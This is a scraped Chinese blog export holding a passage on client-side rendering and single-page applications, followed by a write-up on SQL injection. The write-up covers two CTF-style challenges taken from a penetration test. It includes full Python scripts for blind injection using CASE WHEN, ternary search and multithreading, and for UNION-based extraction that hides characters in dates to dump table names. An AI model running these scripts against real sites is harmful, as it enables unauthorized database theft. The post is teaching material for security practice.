抓取文章 function getPosts() &#123; $.ajax(&#123; url: 'http://localhost:3000/', success: function(response) &#123; if (!response.posts) &#123; return alert('Error'); &#125; for(var i = 0; i &lt; response.posts.length; i++) &#123; // 丟給 render function addPost(response.posts[i]); &#125; &#125;, error: function(err) &#123; console.log(err); alert('抓取失敗'); &#125; &#125;) &#125; function addPost(post) &#123; var item = '' + '&lt;div class=\"panel panel-default\">' + '&lt;div class=\"panel-heading\">' + '&lt;h3 class=\"panel-title\">' + post.author +', 發佈時間：' + post.createTime + '&lt;/h3>' + '&lt;/div>' + '&lt;div class=\"panel-body\">' + post.content '&lt;/div>' + '&lt;/div>'; $('.posts').append(item); &#125; &lt;/script> &lt;/head> &lt;body> &lt;div class=\"container\"> &lt;a class=\"btn btn-primary\" href=\"/posts\">發表新留言&lt;/a> &lt;h2>留言列表&lt;/h2> &lt;div class=\"posts\"> &lt;/div> &lt;/div> &lt;/body> &lt;/html> 接著打開 index.html，就可以看到預期中的畫面出現了，跟我們之前用 server side render 產生的畫面應該一模一樣。用右鍵 -&gt; 檢查去檢視，會發現所有元素都在。 但是如果你改用右鍵 -&gt; 檢視原始碼，會發現幾乎是空的： 這個就是 client side render 跟 server side render 最大的差別。因為對於前者，我們是在執行期間「動態」去跟後端伺服器拿資料，再動態產生你看到的那些元素。 而那些元素原本不存在 index.html 裡面，是我們後來自己用 jQuery append 上去的，所以檢視原始碼當然不會出現任何東西。 我們來看一張 client side render 的示意圖： 在 server side 的地方，view 這層直接被忽略了，因為後端只輸出 JSON 格式的資料而已，而這邊的第五步：把傳回來的資料 render 成 HTML 指的就是我們上面那個用 jQuery 動態 append 上去的步驟。 而在這種狀況底下，你有沒有發現前後端已經切開了？ 後端工程師從此之後不用再管 view 裡面到底裝什麼，不用再教前端工程師怎麼跑 rails，他只要負責制定 API 文件，提供前端需要的資料就好。 而前端工程師也不需要跑那些服務了，只需要用他們最熟悉的瀏覽器打開 HTML 檔案就行了，利用 ajax 從後端拿資料，並且在自己這邊用 JavaScript 動態產生內容。 在這種情況下，前後端的部署也可以完全拆開，前端的部分最簡單，只需要隨便找一個可以放 html 檔案的地方就好，例如說 Amazon S3。所以前端幾乎不會有掛掉的問題，也不會有流量的問題，因為它只是個靜態檔案而已。 假如 server 有一天掛了，API 也跟著掛了，使用者依然可以造訪網頁，只是看不到資料而已，或者是你可以顯示出一個錯誤的圖案。但如果是舊的那種綁在一起的架構，server 一旦掛掉，你連畫面都渲染不出來。 再者，因為現在把 data 跟 view 完全切開來，你要替換任何一邊都是很方便的。例如說你後端不想用 rails 了你要用 go，完全沒問題！只要保持 API 的格式一樣，你後端就算要用 C 也沒人管你。 前端也是一樣，你要選 Angular，選 React 或是選 Vue 甚至你要手刻都可以，反正都不關後端工程師的事情。 可是，事情沒那麼簡單雖然這種場景聽起來很美好，但千萬不要忽略了這樣子的改變會造成的後果。 什麼後果？那就是前端會變得有夠複雜。 仔細想想我們一開始提到的那種開發架構，統一從後端 render，所以我一個頁面就準備一個 view 的檔案，如果使用者訪問/posts，我就render(&#39;posts.ejs&#39;)；若是訪問/about，我就render(&#39;about.ejs&#39;)。 第一個問題來了： 既然剛剛說前端只有一個 index.html，那不就代表使用者訪問 /posts跟訪問/about，都是到同一個檔案？那我要怎麼渲染不同頁面？ 因為在以往，路由的部分是 server 負責，就如同我上面說的一樣，server 依據不同的路由來決定要渲染哪一個頁面。可是現在切開之後，前端只剩下一個 index.html 了，那怎麼辦呢？ 只好讓前端來負責了。 前端可以透過window.location或者是 history API 來管理網址，就可以知道使用者現在想要造訪哪一個頁面。 這邊有一個小細節稍微提一下，那就是剛剛講過前端只有一個 html 檔案，所以網址可能像是這樣：https://example.com/index.html。 只有一個網址而已，怎麼知道使用者要造訪哪一個頁面？ 在以前我們要造訪posts的話，網址可能會是：https://example.com/posts，可是現在我們前端已經變成一個靜態檔案了，只有那一個路徑而已，該怎麼做呢？ 第一種方法是利用 hash，例如說https://example.com/index.html#posts，前端再去解析後面的字串。 第二種是利用nginx或其他類似的服務，把所有https://example.com/*的網址都一律輸出 index.html 這個檔案，這樣子看起來就會跟以前一樣了。 我到/posts，server 會回傳 index.html，我到/about server 也會回傳一樣的內容。 但總之呢，因為後端不再處理這邊的路由了，所以這個部分完全轉交給前端負責，你必須在前端自己管理 URL 的狀態，去決定現在要顯示哪一個頁面。 那這邊要怎麼做呢？最簡單的方法就是跟以往後端做法一樣，你到哪一個網址，我就根據網址輸出怎樣的東西。 前端的程式碼大概會長這樣： function render(path) &#123; // 清空整個畫面 $(body).empty(); if (path === 'posts') &#123; renderPostsPage(); &#125; else if (path === 'about') &#123; renderAboutPage(); &#125; &#125; 只要每一次到一個新的網址，我就把現在內容全部清空再渲染一次就好。 是很簡單沒錯，但是效能有大大的問題，因為有些部分你其實根本不用清空。例如說網站最上方會有的導覽列跟最下面的 footer，基本上每一個頁面都有，是不會變的。 針對那些不變的部分，應該保留起來才對，不然每一次都清空重建一樣的東西很沒有效率。你可能會說這不就跟後端以前寫 view 一樣，抽出共通的部分然後放在 layout 裡面之類的。 不不，這不一樣。後端 render 本質上就是「每一個不同頁面就回傳一份不同的 html 檔案」，而我們現在前端 render 其實也有把共通的部分抽出來，但前端的難題在：「要怎麼只更新部分畫面，而不是暴力的每次都砍掉重練」。 你有沒有開始漸漸覺得前端越來越多事情要做了？ Single Page Application當你把這種東西發揮到極致，會覺得很像在寫一個 App 一樣，這東西就叫做 SPA，Single Page Application。 就如同字面上的意思一樣，我們現在只有一個 index.html 檔案，但是用起來卻像一個 App。 最經典的例子就是 Gmail。你在用 Gmail 的時候，完全沒有換頁。全部的動作都是在「同一個頁面」上面發生的，所以你載入的檔案從頭到尾就只有一個 index.html，完全沒有換過。 你在 Gmail 上面做的任何動作，都是用 ajax 發 request 給 server，server 回傳資料以後 client 端再用 JavaScript 把畫面 render 出來。 所以你在用 Gmail 的時候，會感覺好像在用一個 App 而不是在用網頁，因為頁面之間的跳轉很流暢，不像一般網頁中間可能會有白屏出現。 既然都叫做 Application 了，這時候的前端工程師已經不是大家以往想像的那樣，只需要會 HTML 跟 CSS 刻刻畫面，用 JavaScript 做點小特效跟互動。 要寫 SPA 的話，最難的就是狀態的管理。因為很多東西以前後端都幫你做掉了，所以你完全不用考慮這件事，但現在要了。 舉個例子好了，以前你訪問一篇文章，假設是/post/12，一點下去之後快速切回首頁再點擊其他文章，server 也就只是再回傳相對應的 HTML 而已。 可是呢，SPA 就不一樣了，考慮一下下面的流程： 使用者點擊/post/12 query API 使用者返回首頁 使用者點擊/posts/13 query API 拿到 response，渲染頁面 假設使用者點擊的速度很快，在第七步的時候，很有可能會先拿到第二步的 response，就會發生使用者明明點進去 A 文章，內容卻是 B 文章的狀況。 這只是一個簡單的例子，實戰上還有一大堆要考慮的問題，例如說還沒有拿到資料的時候要顯示什麼，拿到之後要怎麼更新等等。 前端 MVC在前端變得愈來愈複雜之後，你應該也能理解為什麼前端需要 MVC 了。如果你有寫過純 PHP，經歷過那種商業邏輯跟 view 跟 model 混雜在同一個檔案的時期，應該也很能理解為什麼需要 MVC。 因為我們要把職責切開來嘛，讓大家各自負責該負責的東西，才不會全部混在一起變成義大利麵。 前端 MVC 其實跟後端 MVC 滿類似，然後前端也要設定路由，剛剛有提過了。就是設定哪一個 URL 要去哪一個 Controller，再去相對應的 Model 拿資料，最後輸出 View。 這邊稍微比較一下前後端的 MVC 在做的事情： &amp;nbsp; 前端 後端 Model 去跟後端 API 拿資料 去跟 DB 拿資料 View 在前端動態產生畫面 無 Controller 呼叫相對應的 Model 並 render 畫面 呼叫相對應的 Model 並傳回資料 你會發現其實前後端做的事情都差不多，只是前端注重在 render 畫面，後端注重在輸出資料。還可以畫出這一張完整的流程圖： 用文字來解釋的話，流程是這樣的： 使用者造訪 &#x2F;posts 這個網址，代表他想看全部文章 前端的路由去處理，負責呼叫對應到的 controller 前端 controller 去呼叫 Model 拿資料 前端 Model 透過 API，去 &#x2F;api&#x2F;posts 這個網址拿資料 後端路由接到 request，丟給對應到的後端 controller 後端 controller 跟後端 Model 拿資料 後端 controller 把資料傳回去 前端 Modle 拿到資料以後回傳給前端 controller，並且把資料丟給 view client side render，把畫面渲染出來 你上面看到的這整套，大概就是最基本的 SPA 的架構了。後端只負責輸出資料，前端來負責抓資料跟渲染畫面。把前後端完完全全的切開了，就算你後端壞掉，你前端還是看得到畫面（只是可能會顯示個錯誤畫面之類的）；你前端壞掉，後端還是能安穩的輸出資料供其他服務使用。 兩邊乾乾淨淨，而且任何一邊都會比較好維護，前端工程師想要改任何跟介面有關的東西，都跟後端完全沒有關係，其實就等於是兩個不同的專案的意思。 我們真的需要 SPA 嗎？上面提到了這麼多，我認為前端開發的複雜化跟 SPA 有滿大的關係，畢竟你現在就等於是在開發一個完整的 App，怎麼可能不複雜？ 可是別忘記問自己： 我們真的需要 SPA 嗎？ 有些場景是一定要用的，例如說音樂播放網站。 為什麼？因為你必須一邊播放音樂，一邊讓他可以在網站上看其他的資料，例如說歌手介紹、專輯介紹之類的。如果你今天不是用 SPA，那使用者點到別的頁面的時候，瀏覽器就跳頁了，音樂就停了。哇靠這個體驗也太差了，完全不能接受。 所以這種網站一定要用 SPA，沒有其他選擇。用了之後因為不會跳頁，所以你點擊歌手介紹的時候，只是發一個 ajax request，然後收到 response 之後用 JavaScript 把接收到的資料 render 成 HTML 顯示出來。不管到哪一個頁面，都不會真的跳轉，不會載入新的 HTML 檔案。 那有些地方我覺得不用也行，但用了之後可以加強使用者體驗，例如說 Twitch 前一陣子的新功能，在你跳去看其他頁面的時候，你原本在看的實況會縮到左下角。 總之，會需要用到 Single Page Application 的場合有兩個，一個是因為必須要這樣做，另一個是因為可以增進使用者體驗，讓使用者覺得操作起來更順暢。 如果你發現你要做的東西不符合這兩種場合，你可以選擇不要做 SPA，可以選擇就依照之前那樣的 MVC 架構，由 server side 去 render、去處理。這一切都是可以選擇的。 除此之外，其實 SPA 也有一些缺點，例如說你明明只要看一個頁面而已，卻要把一大包的 JavaScript 或是其他頁面的 template 一起下載下來。 又或者因為是 client side render，所以有些搜尋引擎爬不到任何資料（因為你的 index.html 幾乎是空的），不過 Google 很厲害，會爬 JavaScript 執行完之後的結果。可是這對 SEO 來說還是不太好。 當然上面都有一些方法可以解決啦，例如說可以把 js 檔案分開，你到那一個頁面就只要下載那一個頁面的 js 即可。SEO 的解決方法則是將兩種結合，第一次先在 server side render，之後的操作都改用 client side render，就可以保證搜尋引擎也能爬到完整的 HTML。 但你知道的，可以解決是一回事，要花多少心力去解決又是另外一回事了。 總結這篇大概講到了一開始最常見的網站架構，然後到近期導致前端開發複雜化的 SPA。我以前剛接觸的時候也是一頭霧水，想說到底前端為什麼需要 MVC。可是經過這一連串的脈絡思考下來，就很能理解原因了。 當你東西變得愈來愈複雜，就需要一個架構去把職責切割開來，不然會造成日後維護上的困難。 當你越瞭解 SPA 所帶來的優缺點，你在選擇要不要用的時候就有更多面向可以參考，就有更多的理由去支持你所做的決定，而不單單僅是「哇！好潮喔！別人用了我也要用！」 希望這篇對大家有幫助，最後附上一篇延伸閱讀：Why I hate your Single Page App","link":"/2017/09/06/spa-single-page-application/"},{"title":"SQL injection 實戰：在限制底下提升速度","text":"前陣子我們團隊在執行滲透測試時，發現了一個有趣的 SQL injection 案例，因為一些特性的關係，沒辦法直接用現成工具撈出資料，需要自己改工具或是寫腳本才能有效利用。因此，這篇將會分享兩個實際案例，以及我自己的幾個解法。 我有把這兩個案例放到 Heroku 上面，做成兩個小挑戰，有興趣的可以自己先玩玩看： （Heroku 沒了QQ） 原本的案例是類似訂房網站的東西，所以這兩個挑戰其實也都是訂房網站會有的功能，第一個是搜尋功能，第二個則是訂房查詢的功能。 第一個挑戰需要從指定的 table 中拿出 flag，第二個挑戰的 flag 隱藏在其他 table 中，請找出那張 table 並且把 flag 取出，flag 格式為：cymetrics&#123;a-z_&#125; 因為 Heroku 有自動休眠機制，所以可能會等個五六秒才看到畫面，這是正常的。 兩題的難度我覺得其實都不高，但重點是如何找出更有效率的解法，底下是兩個案例的講解以及我自己的解法。 案例一：搜尋功能第一個案例是一個搜尋的功能，有一個 table 叫做 home，存著三個欄位：id、name 跟 tags，而 tags 是一個用逗號分割的字串，用來標示這筆資料有哪些 tag。 如果沒傳入任何東西，會回傳底下的資料： [ &#123; \"id\": \"1\", \"name\": \"home1\", \"tags\": \"1,2,3,4\" &#125;, &#123; \"id\": \"2\", \"name\": \"home2\", \"tags\": \"1,5\" &#125; ] 因此我們可以知道資料庫裡一共有兩筆資料，接著我們可以傳入 tag 來 filter，找出指定的資料，像是這樣： https://od-php.herokuapp.com/sql/search.php?tag=5 [ &#123; \"id\": \"2\", \"name\": \"home2\", \"tags\": \"1,5\" &#125; ] tag 參數可以用逗號分格，一次搜尋多個值，像這樣： https://od-php.herokuapp.com/sql/search.php?tag=2,5 [ &#123; \"id\": \"1\", \"name\": \"home1\", \"tags\": \"1,2,3,4\" &#125;, &#123; \"id\": \"2\", \"name\": \"home2\", \"tags\": \"1,5\" &#125; ] 功能大概就是這樣子而已，原本的實際案例會更複雜一點，但為了精簡因此只保留最精華的部分，其他無關的東西都拿掉了。 接著，我們來看一下重點程式碼： $sql = \"SELECT id, name, tags from home \"; if (strpos(strtolower($tag), \"sleep\") !== false) &#123; die(\"QQ\"); &#125; if(!empty($tag) &amp;&amp; is_string($tag)) &#123; $tag_arr = explode(',', $tag); $sql_tag = []; foreach ($tag_arr as $k => $v) &#123; array_push($sql_tag, \"( FIND_IN_SET(&#123;$v&#125;, tags) )\"); &#125; if (!empty($sql_tag)) &#123; $sql.= \"where (\" . implode(' OR ', $sql_tag) . \")\"; &#125; &#125; 這邊直接用字串拼接的方式組成 SQL query，因此很明顯有 SQL injection 的漏洞，如果你傳入 ?tag=&#39;，SQL query 就會出錯，為了方便大家 debug，錯誤時會把 SQL query 印出來。 想要撈出其他資料，一個很直覺的想法是利用 union，但這招在這裡行不通，原因是我們傳進去的參數會用 , 來分割，所以我們的 payload 裡不能有逗號，不然會把整個 query 搞壞，變成很奇怪的樣子。 因此這題有趣的地方之一在於如何不用逗號，利用這個漏洞。 一個簡單直覺的做法是用 case when 搭配 sleep，像這樣： (select case when (content like \"c%\") then 1 else sleep(1) end from flag) 從 response 的回傳時間，可以推測出條件有沒有成立，但因為程式碼把 sleep 給擋掉了，所以沒辦法這樣用（原本的案例是沒有擋這個的，是我額外加上去的）。 但其實仔細觀察會發現我們不需要 sleep，可以利用 case when 的回傳值做原本的 filter 功能，從結果中推測哪個條件成立，像這樣： (select case when (content like \"c%\") then 1 else 10 end from flag) 當條件（content like &#39;c%&#39;）成立時，回傳值就是 1，反之則是 10，而如果是 1 的話，回傳的 JSON 就會有資料，10 的話則沒有，因此我們可以根據有或沒有，得知條件是否成立。 接著，我們就來寫一下這種最簡單做法的腳本。 # exploit-search.py import requests import datetime import json host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = 'abcdefghijklmnopqrstuvwxyz&#125;_' result = 'cymetrics&#123;' while True: if char_index >= len(char_set): print(\"end\") break char = char_set[char_index] payload = f'(select case when (content like \"&#123;result&#125;&#123;char&#125;%\") then 1 else 10 end from flag)' response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;payload&#125;') print(\"trying\", char) if response.ok: data = json.loads(response.text) if len(data) > 0: result += char print(result) char_index = 0 else: char_index += 1 else: print('error') print(response.text) break 簡單來說就是每個字元不斷去試，試到有為止，簡單暴力但有用，跑個三五分鐘大概就能跑出完整的結果，執行過程會像是這樣： 如果像挑戰這樣，我們事先知道 table 名稱跟欄位名稱，頂多執行時間久一點而已，三五分鐘還在可以接受的範圍，但在實際案例中我們可能什麼都不知道，需要去打 information_schema 把各項資訊拿出來，才能把整個資料庫 dump 出來。 因此，我們需要更有效率的做法。 加速：一次試三個其實仔細觀察可以發現，我們可以控制的回傳結果有四種： home1 home2 一起出現（當 tag 是 1） 只有 home1 出現（當 tag 是 2） 只有 home2 出現（當 tag 是 5） 兩個都沒出現（當 tag 是 10） 而剛剛的攻擊方式，我們只用到了兩個狀況，如果四個都利用的話，速度會變成三倍。 利用的方式很簡單，就是我們可以從原本一次試一個，變成一次試三個，像是這樣： (select case when (content like \"a%\") then 1 when (content like \"b%\") then 2 when (content like \"c%\") then 5 else 10 end from flag) 一個 query 可以試三個字元，速度提升了三倍，腳本如下： # exploit-search-3x.py import requests import datetime import json import urllib.parse import time def print_success(raw): print(f\"\\033[92m&#123;raw&#125;\\033[0m\") def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = '&#125;abcdefghijklmnopqrstuvwxyz_' result = 'cymetrics&#123;' start = time.time() while True: found = False for i in range(0, len(char_set), 3): chars = char_set[i:i+3] while len(chars) &lt; 3: chars += 'a' payload = f''' (select case when (content like \"&#123;result+chars[0]&#125;%\") then 1 when (content like \"&#123;result+chars[1]&#125;%\") then 2 when (content like \"&#123;result+chars[2]&#125;%\") then 5 else 10 end from flag) ''' print(\"trying \" + str(chars)) response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;encode(payload)&#125;') if response.ok: data = json.loads(response.text) if len(data) == 2: result+=chars[0] found = True elif len(data) == 0: continue else: found = True if data[0][\"name\"] == \"home1\": result+=chars[1] else: result+=chars[2] else: print('error') print(response.text) break if found: print_success(\"found: \" + result) break if not found: print(\"end\") print(response.text) break print(f\"time: &#123;time.time() - start&#125;s\") 跑起來會像這樣： 跑了大概 90 秒左右得出答案，比原本的快了不少。 假設 n 是字串長度，而我們的字元集大約 27 個，最差的狀況下，原本需要 27n 次嘗試才能得到 flag，而換成這種方法以後，只要 27n&#x2F;3 &#x3D; 9n 次。 不過這樣還不夠快，既然都可以有三種結果了，那何不如換種方式利用呢？ 再次加速：三分搜與其三個三個試，不如換成「三組三組」試，例如說原本的字元集是 &#125;abcdefghijklmnopqrstuvwxyz_，分成三等份會變成： }abcdefgh ijklmnopq rstuvwxyz_ 我們去看字元是不是在某個特定組別裡面，SQL query 如下： (select case when ( (content like 'cymetrics&#123;&#125;%') or (content like 'cymetrics&#123;a%') or (content like 'cymetrics&#123;b%') or (content like 'cymetrics&#123;c%') or (content like 'cymetrics&#123;d%') or (content like 'cymetrics&#123;e%') or (content like 'cymetrics&#123;f%') or (content like 'cymetrics&#123;g%') or (content like 'cymetrics&#123;h%') ) then 1 when ( (content like 'cymetrics&#123;i%') or (content like 'cymetrics&#123;j%') or (content like 'cymetrics&#123;k%') or (content like 'cymetrics&#123;l%') or (content like 'cymetrics&#123;m%') or (content like 'cymetrics&#123;n%') or (content like 'cymetrics&#123;o%') or (content like 'cymetrics&#123;p%') or (content like 'cymetrics&#123;q%') ) then 2 when ( (content like 'cymetrics&#123;r%') or (content like 'cymetrics&#123;s%') or (content like 'cymetrics&#123;t%') or (content like 'cymetrics&#123;u%') or (content like 'cymetrics&#123;v%') or (content like 'cymetrics&#123;w%') or (content like 'cymetrics&#123;x%') or (content like 'cymetrics&#123;y%') or (content like 'cymetrics&#123;z%') or (content like 'cymetrics&#123;\\_%') ) then 5 else 10 end from flag) 每次都分成三等份搜尋，就變成了三分搜尋法，最壞的狀況下需嘗試的次數從 9n 變成了 3n，腳本如下（三分搜的部分算是亂寫的，不保證沒有 bug）： # exploit-search-teanary.py import requests import time import json import urllib.parse def print_success(raw): print(f\"\\033[92m&#123;raw&#125;\\033[0m\") def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = '&#125;abcdefghijklmnopqrstuvwxyz_' result = 'cymetrics&#123;' is_over = False start = time.time() while True: print_success(\"result: \" + result) if is_over: break found = False L = 0 R = len(char_set) - 1 while L&lt;=R: s = (R-L) // 3 ML = L + s MR = L + s * 2 if s == 0: MR = L + 1 group = [ char_set[L:ML], char_set[ML:MR], char_set[MR:R+1] ] conditions = [] for i in range(0, 3): if len(group[i]) == 0: # 空的話加上 1=2，一個恆假的條件 conditions.append(\"1=2\") continue # 這邊要對 _ 做處理，加上 /，否則 _ 會配對到任意一個字元 arr = [f\"(content like '&#123;result&#125;&#123;chr(92) + c if c == '_' else c&#125;%')\" for c in group[i]] conditions.append(\" or \".join(arr)) payload = f''' (select case when (&#123;conditions[0]&#125;) then 1 when (&#123;conditions[1]&#125;) then 2 when (&#123;conditions[2]&#125;) then 5 else 10 end from flag) ''' print(\"trying\", group) response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;encode(payload)&#125;') if not response.ok: print('error') print(response.text) print(payload) is_over = True break data = json.loads(response.text) if len(data) == 0: print(\"end\") is_over = True break if len(data) == 2: R = ML if len(group[0]) == 1: result += group[0] break else: if data[0][\"name\"] == \"home1\": L = ML R = MR if len(group[1]) == 1: result += group[1] break else: L = MR if len(group[2]) == 1: result += group[2] break print(f\"time: &#123;time.time() - start&#125;s\") 執行的結果如圖： 跑了 45 秒，比剛剛的做法又快了一倍。 最後的加速：多執行緒前面我們都是等一個 request 回來才發下一個，但其實可以用多執行緒同時去發 request，例如說每一個 thread 固定去猜一個位置的值，速度應該能快上不少。 雖然需要嘗試的次數是一樣的，但每秒嘗試的次數變多了，所以整體秒數自然也變少了。 底下是簡單實作的程式碼，需要先知道最後字串的長度，要再做精緻一點就是先搜出要撈的資料長度，然後再去撈資料本身： # exploit-search-thread.py import requests import time import json import urllib.parse import concurrent.futures def print_success(raw): print(f\"\\033[92m&#123;raw&#125;\\033[0m\") def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' char_index = 0 char_set = '&#125;abcdefghijklmnopqrstuvwxyz_' flag = 'cymetrics&#123;' def get_char(index): L = 0 R = len(char_set) - 1 prefix = flag + \"_\" * index while L&lt;=R: s = (R-L) // 3 ML = L + s MR = L + s * 2 if s == 0: MR = L + 1 group = [ char_set[L:ML], char_set[ML:MR], char_set[MR:R+1] ] conditions = [] for i in range(0, 3): if len(group[i]) == 0: conditions.append(\"1=2\") continue arr = [f\"(content like '&#123;prefix&#125;&#123;chr(92) + c if c == '_' else c&#125;%')\" for c in group[i]] conditions.append(\" or \".join(arr)) payload = f''' (select case when (&#123;conditions[0]&#125;) then 1 when (&#123;conditions[1]&#125;) then 2 when (&#123;conditions[2]&#125;) then 5 else 10 end from flag) ''' print(f\"For &#123;index&#125; trying\", group) response = requests.get(f'&#123;host&#125;/search.php?tag=&#123;encode(payload)&#125;') if not response.ok: print('error') print(response.text) print(payload) return False data = json.loads(response.text) if len(data) == 0: return False if len(data) == 2: R = ML if len(group[0]) == 1: return group[0] else: if data[0][\"name\"] == \"home1\": L = ML R = MR if len(group[1]) == 1: return group[1] else: L = MR if len(group[2]) == 1: return group[2] def run(): length = 15 ans = [None] * length with concurrent.futures.ThreadPoolExecutor(max_workers=length) as executor: futures = &#123;executor.submit(get_char, i): i for i in range(length)&#125; for future in concurrent.futures.as_completed(futures): index = futures[future] data = future.result() print_success(f\"Index &#123;index&#125; is &#123;data&#125;\") ans[index] = data print_success(f\"flag: &#123;flag&#125;&#123;''.join([n for n in ans if n != False])&#125;\") start = time.time() run() print(f\"time: &#123;time.time() - start&#125;s\") 跑起來像這樣： 我們開了 15 個 thread，時間從 45 秒降低成 3 秒，利用多執行緒讓整體速度提升了 15 倍。 總結一下，在 SQL 方面，我們可以利用三分搜來降低嘗試次數，在 SQL 方面這已經是我能想到最快的方法了，如果還有更快的，請在底下留言告訴我。 在程式方面，則是可以用多執行緒同時發出多個 request，來加快嘗試的速度，跟 SQL 的最佳化互相搭配之後就能大幅降低秒數。 案例二：訂房查詢功能這個挑戰是訂房查詢的功能，會傳入三個參數： id start_time end_time 接著系統會去查詢一張叫做 price 的 table，找出符合條件的資料，就代表那一天有設定價格，所以可以訂房，而回傳的資料中會根據 start_time 跟 end_time，回傳這之中的每一天是否可以訂房，可以的話就顯示 Available，否之則顯示 Unavailable。 這題的注入點在 id，因為 id 沒有被 escape，所以可以執行 SQL injection，我們先來看一下這題的程式碼： for ($i = $startTime; $i &lt;= $endTime; $i = strtotime('+1 day', $i)) &#123; $found = false; foreach ($priceItems['results'] as $range) &#123; if ($i == $range[\"start_time\"] &amp;&amp; $i &lt;= $range[\"end_time\"]) &#123; $data = $range; $found = true; break; &#125; &#125; if ($found) &#123; $events['events'][] = [ 'start' => date('Y-m-d', $data[\"start_time\"]), 'end' => date('Y-m-d', $data[\"end_time\"]), 'status' => \"Available\", ]; &#125; else &#123; $events['events'][] = [ 'start' => date('Y-m-d', $i), 'end' => date('Y-m-d', $i), 'status' => \"Unavailable\", ]; &#125; &#125; 如同前面提到的，這題會從傳入的 start_time 開始一天一天加，加到 end_time 為止，而這之中的每一天會去 priceItems 裡面查，看有沒有符合區間的資料，有找到的話就會把那天的 status 設成 Available，反之則是 Unavailable。 底下則是撈出 price items 資料的程式碼，query 的部分為了方便閱讀我有改了一下排版： function getPriceItems($id, $start, $end) &#123; global $conn; $start = esc_sql($start); $end = esc_sql($end); $sql = \" select * from price where ( (price.start_time >= &#123;$start&#125; AND price.end_time &lt;= &#123;$end&#125;) OR (price.start_time &lt;= &#123;$start&#125; AND price.end_time >= &#123;$start&#125;) OR (price.start_time &lt;= &#123;$end&#125; AND price.end_time >= &#123;$end&#125;) ) AND price.home_id = &#123;$id&#125;\"; $result = $conn->query($sql); $arr = []; if ($result) &#123; while($row = $result->fetch_assoc()) &#123; array_push($arr, $row); &#125; &#125; else &#123; die($sql); &#125; return [ 'results' => $arr ]; &#125; ?> 在 id 的地方我們可以用 union 的方式來讓 price items 變成我們指定的資料，由於 union 需要知道有幾個欄位，因此可以先用 order by &#123;number&#125; 的方式去看看有幾個欄位，例如說 order by 2，代表用第二個欄位來排序，如果不足第二個就會出錯，所以我們可以用類似二分搜的方法知道有幾個欄位，嘗試過後發現一共是 4 個欄位。 接著，2023-01-01 換成 timestamp 是 1672502400，因此我們的 id 可以長這樣： 0 union select 1672502400,1672502400,1672502400,1672502400 會發現回傳的資料中，status 變成 Available，代表我們的 SQL injection 成功了，再來就是要去試哪一個欄位是 start_time，哪一個又是 end_time，可以把每個欄位都變成 1，看看回傳結果會不會改變，就知道有沒有動到這兩個欄位。 總之呢，一波嘗試過後發現第二個欄位是 start_time，第三個是 end_time。 那我們可以怎麼利用呢？一個簡單的做法是像上一題一樣，用 case when 來做事，例如說某條件符合時就 select 出指定的資料（狀態會變 Available），不符合則否（狀態會是 Unavailable），一樣可以慢慢把資料弄出來。 不過這題跟上一題有個很大的不同點，那就是這一題我們可以控制輸出資料中的 start_time 跟 end_time，雖然這兩個值一定要是日期，但我們可以把想回傳的資料偷渡在日期裡面。 我的做法就是這樣，簡單來說就是把想回傳的資料變成一個日期。 我們可以先拿到資料中的第 n 個字元，假設轉成 ascii 之後會是 x，我們可以把這個視為「x 天」的意思，我們把 x*3600*24 再加上 2023-01-01 的 timestamp 1672502400，就會得到一個新的 timestamp 做為 end_time，並且在 php 被轉成日期。 而我們從 response 中拿到這個日期以後，只要算出從 2023-01-01 過了幾天即可，因此把日期先轉回 timestamp，再減去 1672502400 以後除以 86400(3600*24)，就會得到這個天數，假設是 98 天好了，就代表當初讀到的字元是 chr(98) 也就是 b，就得到了一個字元。 因此，藉由把 ascii code 偷渡在日期中，每做一次操作我們可以拿到一個字元的資料，程式碼如下： # exploit-ava.py import requests import datetime import json import urllib.parse import time host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" fr = urllib.parse.quote(fr.encode('utf8')) start = time.time() while True: payload = f'ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400%2b&#123;base_time&#125;' response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20union%20select%201%20,&#123;base_time&#125;,&#123;payload&#125;,4%20&#123;fr&#125;&amp;start_time=2023-01-01&amp;end_time=2023-01-01') index +=1 if response.ok: data = json.loads(response.text) d = data['events'][0]['end'] if d == '2023-01-01': break else: diff = datetime.datetime.strptime(d, \"%Y-%m-%d\").timestamp() - base_time result += chr(int(diff/86400)) print(result) else: print('error') break print(f\"time: &#123;time.time() - start&#125;s\") 跑起來的結果會是這樣： 一次 leak 出一個字元，花了大約 40 秒得到完整結果。 加速：一次偷渡兩個字既然都可以把資料換成數字偷偷塞在日期裡面了，何不一次偷渡兩個字呢？為了不讓數字衝突而且好算，第二個字需要再乘以 128。 程式碼如下： # exploit-ava-2x.py import requests import datetime import json import urllib.parse import time def encode(raw): return urllib.parse.quote(raw.encode('utf8')) host = 'https://od-php.herokuapp.com/sql' base_time = 1672502400 index = 1 result = '' field = 'group_concat(table_name)' fr = \" FROM information_schema.tables WHERE table_schema != 'mysql' AND table_schema != 'information_schema'\" fr = encode(fr) start = time.time() while True: payload = f''' ascii(SUBSTRING(&#123;field&#125;,&#123;index&#125;))*86400 + ascii(SUBSTRING(&#123;field&#125;,&#123;index+1&#125;))*86400*128 + &#123;base_time&#125; ''' response = requests.get(f'&#123;host&#125;/availability.php?id=12345%20union%20select%201%20,&#123;base_time&#125;,&#123;encode(payload)&#125;,4%20&#123;fr&#125;&amp;start_time=2023-01-01&amp;end_time=2023-01-01') index +=2 if response.ok: data = json.loads(response.text) d = data['events'][0]['end'] if d == '2023-01-01': break else: diff = datetime.datetime.strptime(d, \"%Y-%m-%d\").timestamp() - base_time diff = int(diff/86400) first = diff % 128 result += chr(first) second = int((diff - first) / 128) if second == 0: break result += chr(second) print(\"current:\", result) else: print('error') break print(\"result:\", result) print(f\"time: &#123;time.time() - start&#125;s\") 跑起來的結果： 總共花了 19 秒，是上一個做法的兩倍，十分合理。 